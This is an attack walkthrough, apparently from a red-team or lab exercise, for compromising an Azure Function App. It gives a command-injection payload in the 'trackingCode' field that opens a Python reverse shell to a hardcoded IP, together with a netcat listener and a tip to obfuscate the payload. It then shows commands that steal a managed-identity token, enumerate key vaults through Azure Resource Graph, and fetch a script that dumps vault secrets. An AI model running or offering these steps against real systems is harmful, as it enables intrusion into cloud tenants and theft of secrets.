**Order of operations:**

- Open a listener on your attacking virtual machine.
    - ncat -lvnp 9731
- Invoke the Function App with the following properties. This creates a reverse shell. Make sure to set the ip/port to match the machine that you're using to attack. You can also opt to obfuscate the command, which is recommended.
    - orderId = 000001, action = details, trackingCode = os.system("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"20.56.177.42\",9731));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'")
- Validate that you've got a reverse shell going from the function app. Print all environment variables and check if they're function app specific.
    - env
- If the previous command confirmed your succesfull shell establishment, it's time to steal the token. Run the following commands to get a token. Copy the token from the terminal to your local machine.
    - pip install azure-identity azure-keyvault-secrets
    - python3 -c 'from azure.identity import DefaultAzureCredential; cred = DefaultAzureCredential(); token = cred.get_token("https://management.azure.com").token; print(token)'
- Go to https://jwt.ms and paste the token. Make sure you've removed all the newline characters which appear when you copy/paste using Azure Bastion. Select the claims tab and search for a property called "xms_mirid". This will contain the entire ResourceId, which will also contain the subscription Id. Copy it for the nest step
- Use your remote shell to run the following commands, which will authenticate to the Azure Resource Graph and print out all the keyvaults this function app has access to based on the managed identity reader role.
    - python3 -c 'import requests, json; from azure.identity import DefaultAzureCredential; cred = DefaultAzureCredential(); token = cred.get_token("https://management.azure.com").token; headers = {"Authorization": f"Bearer {token}", "Content-Type": "Application/json"}; url = "https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2022-10-01"; res = "Microsoft.KeyVault/vaults"; data = json.dumps({"subscriptions": ["3a89d508-f992-4729-9058-ba4fae9a35ca"], "query": "Resources"}); response= requests.post(url=url, headers=headers, data=data); print(response.text)'
- Now that you know the keyvault name, you can try to enumerate all the secrets. Download your exploitation script with the following command and run it.
    - wget something somewhere/scriptname.py
    - ./scriptname.py keyvaultname
- The script should output all the secrets inside the keyvault. You've succesfully enumerated the vault!

-----
